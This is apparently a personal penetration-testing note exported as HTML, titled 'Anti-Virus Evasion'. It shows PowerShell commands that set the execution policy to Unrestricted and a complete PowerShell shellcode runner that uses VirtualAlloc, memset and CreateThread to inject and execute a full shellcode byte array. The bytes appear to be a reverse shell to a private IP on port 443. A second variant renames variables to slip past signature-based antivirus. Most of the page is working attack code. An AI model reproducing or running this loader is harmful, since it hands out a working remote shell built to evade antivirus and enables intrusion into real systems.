<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Anti-Virus Evasion</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Anti-Virus Evasion</h1><br/><p><h1>AV detection methods</h1><ul><li>signature based</li><li>behavior based</li><li>machine learning based</li></ul></p><p></p><p></p><p><h1># enable Execution policy</h1></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">Get-ExecutionPolicy</span> <span style="color:#ff9d00;font-weight:700">-</span>Scope CurrentUser<br /><br /><span style="color:#ff9d00;font-weight:700">Set-ExecutionPolicy</span> <span style="color:#ff9d00;font-weight:700">-</span>ExecutionPolicy Unrestricted <span style="color:#ff9d00;font-weight:700">-</span>Scope CurrentUser</pre></div></p><p></p><p><h1># evading AV with thread injection</h1></p><p>powershell script for process memory injection </p><p></p><p></p><p>detected:</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$code</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;<br />[DllImport(&quot;kernel32.dll&quot;)]<br />public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);<br /><br />[DllImport(&quot;kernel32.dll&quot;)]<br />public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);<br /><br />[DllImport(&quot;msvcrt.dll&quot;)]<br />public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;</span>;<br /><br /><span style="color:#0088ff;font-weight:400">$winFunc</span> <span style="color:#ff9d00;font-weight:700">=</span> <br />  <span style="color:#ff9d00;font-weight:700">Add-Type</span> <span style="color:#ff9d00;font-weight:700">-</span>memberDefinition <span style="color:#0088ff;font-weight:400">$code</span> <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#3ad900;font-weight:400">&quot;Win32&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>namespace Win32Functions <span style="color:#333333;font-weight:400">-passthru</span>;<br /><br />[<span style="color:#7f0044;font-weight:400">Byte</span>[]];<br />[<span style="color:#7f0044;font-weight:400">Byte</span>[]]<span style="color:#0088ff;font-weight:400">$sc</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0xfc</span>,<span style="color:#333333;font-weight:400">0xe8</span>,<span style="color:#333333;font-weight:400">0x82</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x60</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe5</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x64</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x30</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0xc</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x14</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x28</span>,<span style="color:#333333;font-weight:400">0xf</span>,<span style="color:#333333;font-weight:400">0xb7</span>,<span style="color:#333333;font-weight:400">0x4a</span>,<span style="color:#333333;font-weight:400">0x26</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xac</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0x7c</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0x2c</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xcf</span>,<span style="color:#333333;font-weight:400">0xd</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0xe2</span>,<span style="color:#333333;font-weight:400">0xf2</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x10</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x4a</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x11</span>,<span style="color:#333333;font-weight:400">0x78</span>,<span style="color:#333333;font-weight:400">0xe3</span>,<span style="color:#333333;font-weight:400">0x48</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd1</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x20</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd3</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x18</span>,<span style="color:#333333;font-weight:400">0xe3</span>,<span style="color:#333333;font-weight:400">0x3a</span>,<span style="color:#333333;font-weight:400">0x49</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x34</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd6</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xac</span>,<span style="color:#333333;font-weight:400">0xc1</span>,<span style="color:#333333;font-weight:400">0xcf</span>,<span style="color:#333333;font-weight:400">0xd</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0x38</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xf6</span>,<span style="color:#333333;font-weight:400">0x3</span>,<span style="color:#333333;font-weight:400">0x7d</span>,<span style="color:#333333;font-weight:400">0xf8</span>,<span style="color:#333333;font-weight:400">0x3b</span>,<span style="color:#333333;font-weight:400">0x7d</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xe4</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd3</span>,<span style="color:#333333;font-weight:400">0x66</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0xc</span>,<span style="color:#333333;font-weight:400">0x4b</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x58</span>,<span style="color:#333333;font-weight:400">0x1c</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd3</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x4</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xd0</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x5b</span>,<span style="color:#333333;font-weight:400">0x5b</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x51</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x5f</span>,<span style="color:#333333;font-weight:400">0x5f</span>,<span style="color:#333333;font-weight:400">0x5a</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x12</span>,<span style="color:#333333;font-weight:400">0xeb</span>,<span style="color:#333333;font-weight:400">0x8d</span>,<span style="color:#333333;font-weight:400">0x5d</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x33</span>,<span style="color:#333333;font-weight:400">0x32</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x73</span>,<span style="color:#333333;font-weight:400">0x32</span>,<span style="color:#333333;font-weight:400">0x5f</span>,<span style="color:#333333;font-weight:400">0x54</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x4c</span>,<span style="color:#333333;font-weight:400">0x77</span>,<span style="color:#333333;font-weight:400">0x26</span>,<span style="color:#333333;font-weight:400">0x7</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0xb8</span>,<span style="color:#333333;font-weight:400">0x90</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x29</span>,<span style="color:#333333;font-weight:400">0xc4</span>,<span style="color:#333333;font-weight:400">0x54</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x29</span>,<span style="color:#333333;font-weight:400">0x80</span>,<span style="color:#333333;font-weight:400">0x6b</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x40</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0xea</span>,<span style="color:#333333;font-weight:400">0xf</span>,<span style="color:#333333;font-weight:400">0xdf</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x97</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x5</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0xa8</span>,<span style="color:#333333;font-weight:400">0x32</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x2</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0xbb</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe6</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x10</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x99</span>,<span style="color:#333333;font-weight:400">0xa5</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0x61</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x85</span>,<span style="color:#333333;font-weight:400">0xc0</span>,<span style="color:#333333;font-weight:400">0x74</span>,<span style="color:#333333;font-weight:400">0xc</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0x4e</span>,<span style="color:#333333;font-weight:400">0x8</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0xec</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0xf0</span>,<span style="color:#333333;font-weight:400">0xb5</span>,<span style="color:#333333;font-weight:400">0xa2</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x63</span>,<span style="color:#333333;font-weight:400">0x6d</span>,<span style="color:#333333;font-weight:400">0x64</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe3</span>,<span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x57</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xf6</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x12</span>,<span style="color:#333333;font-weight:400">0x59</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0xe2</span>,<span style="color:#333333;font-weight:400">0xfd</span>,<span style="color:#333333;font-weight:400">0x66</span>,<span style="color:#333333;font-weight:400">0xc7</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0x1</span>,<span style="color:#333333;font-weight:400">0x8d</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x24</span>,<span style="color:#333333;font-weight:400">0x10</span>,<span style="color:#333333;font-weight:400">0xc6</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x44</span>,<span style="color:#333333;font-weight:400">0x54</span>,<span style="color:#333333;font-weight:400">0x50</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x46</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x4e</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x79</span>,<span style="color:#333333;font-weight:400">0xcc</span>,<span style="color:#333333;font-weight:400">0x3f</span>,<span style="color:#333333;font-weight:400">0x86</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x4e</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x46</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0x30</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0x8</span>,<span style="color:#333333;font-weight:400">0x87</span>,<span style="color:#333333;font-weight:400">0x1d</span>,<span style="color:#333333;font-weight:400">0x60</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0xbb</span>,<span style="color:#333333;font-weight:400">0xf0</span>,<span style="color:#333333;font-weight:400">0xb5</span>,<span style="color:#333333;font-weight:400">0xa2</span>,<span style="color:#333333;font-weight:400">0x56</span>,<span style="color:#333333;font-weight:400">0x68</span>,<span style="color:#333333;font-weight:400">0xa6</span>,<span style="color:#333333;font-weight:400">0x95</span>,<span style="color:#333333;font-weight:400">0xbd</span>,<span style="color:#333333;font-weight:400">0x9d</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>,<span style="color:#333333;font-weight:400">0x3c</span>,<span style="color:#333333;font-weight:400">0x6</span>,<span style="color:#333333;font-weight:400">0x7c</span>,<span style="color:#333333;font-weight:400">0xa</span>,<span style="color:#333333;font-weight:400">0x80</span>,<span style="color:#333333;font-weight:400">0xfb</span>,<span style="color:#333333;font-weight:400">0xe0</span>,<span style="color:#333333;font-weight:400">0x75</span>,<span style="color:#333333;font-weight:400">0x5</span>,<span style="color:#333333;font-weight:400">0xbb</span>,<span style="color:#333333;font-weight:400">0x47</span>,<span style="color:#333333;font-weight:400">0x13</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x6f</span>,<span style="color:#333333;font-weight:400">0x6a</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x53</span>,<span style="color:#333333;font-weight:400">0xff</span>,<span style="color:#333333;font-weight:400">0xd5</span>;;<br /><br /><span style="color:#0088ff;font-weight:400">$size</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0x1000</span>;<br /><br /><span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$sc</span>.Length <span style="color:#ff9d00;font-weight:700">-gt</span> <span style="color:#333333;font-weight:400">0x1000</span>) {<span style="color:#0088ff;font-weight:400">$size</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$sc</span>.Length};<br /><br /><span style="color:#0088ff;font-weight:400">$x</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$winFunc</span><span style="color:#ff9d00;font-weight:700">::</span>VirtualAlloc(<span style="color:#333333;font-weight:400">0</span>,<span style="color:#0088ff;font-weight:400">$size</span>,<span style="color:#333333;font-weight:400">0x3000</span>,<span style="color:#333333;font-weight:400">0x40</span>);<br /><br /><span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#0088ff;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">0</span>;<span style="color:#0088ff;font-weight:400">$i</span> <span style="color:#ff9d00;font-weight:700">-le</span> (<span style="color:#0088ff;font-weight:400">$sc</span>.<span style="color:#00117f;font-weight:400">Length-1</span>);<span style="color:#0088ff;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:700">++</span>) {<span style="color:#0088ff;font-weight:400">$winFunc</span><span style="color:#ff9d00;font-weight:700">::</span>memset([IntPtr](<span style="color:#0088ff;font-weight:400">$x</span>.ToInt32()<span style="color:#ff9d00;font-weight:700">+</span><span style="color:#0088ff;font-weight:400">$i</span>), <span style="color:#0088ff;font-weight:400">$sc</span>[<span style="color:#0088ff;font-weight:400">$i</span>], <span style="color:#333333;font-weight:400">1</span>)};<br /><br /><span style="color:#0088ff;font-weight:400">$winFunc</span><span style="color:#ff9d00;font-weight:700">::</span>CreateThread(<span style="color:#333333;font-weight:400">0</span>,<span style="color:#333333;font-weight:400">0</span>,<span style="color:#0088ff;font-weight:400">$x</span>,<span style="color:#333333;font-weight:400">0</span>,<span style="color:#333333;font-weight:400">0</span>,<span style="color:#333333;font-weight:400">0</span>);<span style="color:#ff9d00;font-weight:700">for</span> (;;) { <span style="color:#ff9d00;font-weight:700">Start-sleep</span> <span style="color:#333333;font-weight:400">60</span> };<br /></pre></div></p><p>------</p><p>non detected:</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$var2</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">Add-Type</span> <span style="color:#ff9d00;font-weight:700">-</span>memberDefinition <span style="color:#0088ff;font-weight:400">$code</span> <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#3ad900;font-weight:400">&quot;iWin32&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>namespace Win32Functions <span style="color:#333333;font-weight:400">-passthru</span>;<br /><br />[<span style="color:#7f0044;font-weight:400">Byte</span>[]];   <br />[<span style="color:#7f0044;font-weight:400">Byte</span>[]] <span style="color:#0088ff;font-weight:400">$var1</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0xfc</span>,<span style="color:#333333;font-weight:400">0xe8</span>,<span style="color:#333333;font-weight:400">0x8f</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x0</span>,<span style="color:#333333;font-weight:400">0x60</span>,<span style="color:#333333;font-weight:400">0x89</span>,<span style="color:#333333;font-weight:400">0xe5</span>,<span style="color:#333333;font-weight:400">0x31</span>,<span style="color:#333333;font-weight:400">0xd2</span>,<span style="color:#333333;font-weight:400">0x64</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x30</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0xc</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x52</span>,<span style="color:#333333;font-weight:400">0x14</span>,<span style="color:#333333;font-weight:400">0x8b</span>,<span style="color:#333333;font-weight:400">0x72</span>,<span style="color:#333333;font-weight:400">0x28</span><br />...<br /><br /><span style="color:#0088ff;font-weight:400">$size</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0x1000</span>;<br /><br /><span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$var1</span>.Length <span style="color:#ff9d00;font-weight:700">-gt</span> <span style="color:#333333;font-weight:400">0x1000</span>) {<span style="color:#0088ff;font-weight:400">$size</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$var1</span>.Length};<br /><br /><span style="color:#0088ff;font-weight:400">$x</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$var2</span><span style="color:#ff9d00;font-weight:700">::</span>VirtualAlloc(<span style="color:#333333;font-weight:400">0</span>,<span style="color:#0088ff;font-weight:400">$size</span>,<span style="color:#333333;font-weight:400">0x3000</span>,<span style="color:#333333;font-weight:400">0x40</span>);<br /><br /><span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#0088ff;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">0</span>;<span style="color:#0088ff;font-weight:400">$i</span> <span style="color:#ff9d00;font-weight:700">-le</span> (<span style="color:#0088ff;font-weight:400">$var1</span>.<span style="color:#00117f;font-weight:400">Length-1</span>);<span style="color:#0088ff;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:700">++</span>) {<span style="color:#0088ff;font-weight:400">$var2</span><span style="color:#ff9d00;font-weight:700">::</span>memset([IntPtr](<span style="color:#0088ff;font-weight:400">$x</span>.ToInt32()<span style="color:#ff9d00;font-weight:700">+</span><span style="color:#0088ff;font-weight:400">$i</span>), <span style="color:#0088ff;font-weight:400">$var1</span>[<span style="color:#0088ff;font-weight:400">$i</span>], <span style="color:#333333;font-weight:400">1</span>)};<br /><br /><span style="color:#0088ff;font-weight:400">$var2</span><span style="color:#ff9d00;font-weight:700">::</span>CreateThread(<span style="color:#333333;font-weight:400">0</span>,<span style="color:#333333;font-weight:400">0</span>,<span style="color:#0088ff;font-weight:400">$x</span>,<span style="color:#333333;font-weight:400">0</span>,<span style="color:#333333;font-weight:400">0</span>,<span style="color:#333333;font-weight:400">0</span>);<span style="color:#ff9d00;font-weight:700">for</span> (;;) { <span style="color:#ff9d00;font-weight:700">Start-sleep</span> <span style="color:#333333;font-weight:400">60</span> };<br /></pre></div></p></div>
</body>
</html>
